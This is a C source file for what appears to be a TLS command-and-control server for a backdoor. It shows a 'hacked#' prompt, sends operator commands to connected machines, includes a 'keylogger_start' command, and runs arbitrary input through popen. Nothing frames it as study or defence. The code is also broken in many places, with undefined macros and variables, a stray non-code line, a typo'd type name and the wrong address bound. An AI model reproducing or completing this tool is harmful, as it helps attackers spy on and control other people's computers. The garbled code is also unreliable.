#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <syslog.h>
#include <pthread.h>

#define MAX_CLIENTS 100
#define BUFFER_SZ 1024

typedef struct
{
	int client_socket;
	char client_ip[INET_ADDRSTRLEN];
} ClientData;

void init_openssl()
{
	SSL_load_error_strings();
	OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl()
{
	EVP_cleanup();
}

SSL_CTX *create_context()
{
	const SSL_METHOD *method = TLS_server_method();
	SSL_CTX *ctx = SSL_CTX_new(method);
	if (!ctx)
	{
		syslog(LOG_ERR, "Unable to create SSL context");
		exit(EXIT_FAILURE);
	}
	return ctx;
}

void configure_context(SSL_CTX *ctx)
{
	SSL_CTX_set_ecdh_auto(ctx, 1);

	/* Set the certificate and key */
	if (SSL_CTX_use_certificate_file(ctx, "cert.pem", SSL_FILETYPE_PEM) <= 0 ||
		SSL_CTX_use_PrivateKey_file(ctx, "key.pem", SSL_FILETYPE_PEM) <= 0)
	{
		ERR_print_errors_fp(stderr);
		syslog(LOG_ERR, "Unable to load certificate and key file");
		exit(EXIT_FAILURE);
	}
}

void parse_command(const char *command, char *response, size_t response_len) {
	if (strncmp(command, "q", 1) == 0) {
		snprintf(response, response_len, "Exiting...");
	}
	else if (strncmp(command, "cd", 3) == 0) {
		snprintf(response, response_len, "Directory changed");
	}
	else if (strncmp(command, "keylogger_start", 12) == 0) {
		snprintf(response, response_len, "Keylogger started");
	}
	else {
		FILE *fp = popen(command, "r");
		if (fp) {
			fread(response, 1, response_len -1, fp);
			pclose(fp);
			response[response_len - 1] = '\0';
		}
		else {
			snprintf(response, response_len, "Command unknown");
		}
	}
}

// void handle_client(SSL *ssl, const char *client_ip)
void *handle_client(void *arg)
{
	ClientData *data = (ClientData *)arg;
	int client_socket = data->client_socket;
	const char *client_ip = data->client_ip;
	SSL *ssl;
	char buffer[BUFFER_SIZE];
	char response[BUFFER_SIZE];

	ssl = SSL_new(ctx);
	SSL_set_fd(ssl, client_socket);

	if (SSL_accept(ssl) <= 0)
	{
		ERR_print_errors_fp(stderr);
		syslog(LOG_ERR, "SSL accept failed for client %s", client_ip);
		SSL_free(ssl);
		close(client_socket);
		free(data);
		pthread_exit(NULL);
	}

	while (1)
	{
		memset(buffer, 0, sizeof(buffer));
		printf("* hacked#%s-$: ", client_ip);
		fflush(stdout);
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");

		// send command to client machine
		if (SSL_write(ssl, buffer, strlen(buffer)) < 0)
		{
			perror("Write failed");
			break;
		}

		if (strncmp("q", buffer, 1) == 0)
		{
			printf("Closing connection...\n");
			break;
		}
		else {
			parse_command(buffer, response, sizeof(response));
			if(SSL_write(ssl, response, strlen(response)) < 0){
				perror("Write failed");
				break;
			}
		}
		// else if (strncmp("cd ", buffer, 3) == 0)
		// {
		// 	continue;
		// }
		// else if (strncmp("keylog_start", buffer, 12) == 0)
		// {
		// 	continue;
		// }
		// else
		// {
		// 	// Receive response from client
		// 	ssize_t bytes_received = SSL_read(ssl, response, sizeof(response) - 1, MSG_WAITALL);
		// 	if (bytes_received < 0)
		// 	{
		// 		perror("SSL_read failed");
		// 		break;
		// 	}
		// 	else if (bytes_received == 0)
		// 	{
		// 		printf("Client disconnected\n");
		// 		break;
		// 	}
		// 	response[bytes_received] = '\0'; // Null-terminate response
		// 	printf("%s", response);
		// }
	}
	SSL_shutdown(ssl);
	SSL_free(ssl);
	close(client_socket);
	free(data);
	pthread_exit(NULL);
}

int main()
{
	int sock, client_socket;
	struct sockaddr_in addr, server_address, client_address;
	socklen_t client_length = sizeof(client_address);
	SSL_CTX *ctx;
	pthread_t threads[MAX_CLIENTS];
	int client_count = 0;

	/*Initialize OpenSSL*/
	open Initialize OpenSSL
	init_openssl();
	ctx = create_context();
	configure_context(ctx);

	// create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		perror("Socket creation failed");
		exit(EXIT_FAILURE);
	}

	// set socket options
	int optval = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error Setting TCP Socket Options\n");
		close(sock);
		return 1;
	}

	// configure server address
	addr.sin_family = AF_INET;
	addr.sin_port = htons(50004);
	addr.sin_addr.s_addr = INADDR_ANY;

	// bind socket
	if (bind(sock, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
	{
		perror("Binding failed");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// start listening
	if (listen(sock, MAX_CLIENTS) < 0)
	{
		perror("Listening failed");
		close(sock);
		exit(EXIT_FAILURE);
	}

	printf("Waiting for client connection...\n");

	while (1)
	{
		// Accept client connection
		client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);
		if (client_socket < 0)
		{
			perror("Accpet failed");
			close(sock);
			exit(EXIT_FAILURE);
		}

		// Convert client IP address
		inet_ntop(AF_INET, &(client_addr.sin_addr), client_ip, INET_ADDRSTRLEN);
		printf("Connected to client: %s\n", client_ip);

		if(client_count >= MAX_CLIENTS){
			syslog(LOG_WARNING, "Maximum number of clients reached");
			close(client_socket);
			continue;
		}
		ClientData *data = (ClientData *)malloc(sizeof(CLientData));
		if (!data) {
			perror("Memory allocation failed");
			close(client_socket);
			continue;
		}
		data->client_socket = client_socket;
		strncpy(data->client_ip, client_ip, INET_ADDRSTRLEN);

		if (pthread_create(&threads[client_count], NULL, handle_client, data) != 0) {
			perror("Thread creation failed");
			free(data);
			close(client_socket);
			continue;
		}
		client_count++;
	}
	close(sock);
	SSL_CTX_free(ctx);
	cleanup_openssl();
	// return 0;
		// Establish SSL connection
		// SSL *ssl = SSL_new(ctx);
		// SSL_set_fd(ssl, client_sock);

		// if (SSL_accept(ssl) <= 0)
		// {
		// 	ERR_print_errors_fp(stderr);
		// }
		// else
		// {
		// 	handle_client(ssl, client_ip);
		// }

		// SSL_shutdown(SSL);
		// SSL_free(ssl);
		// close(client);
		// close(sock);
		// SSL_CTX_free(ctx);
		// cleanup_openssl();
	
	return 0;
}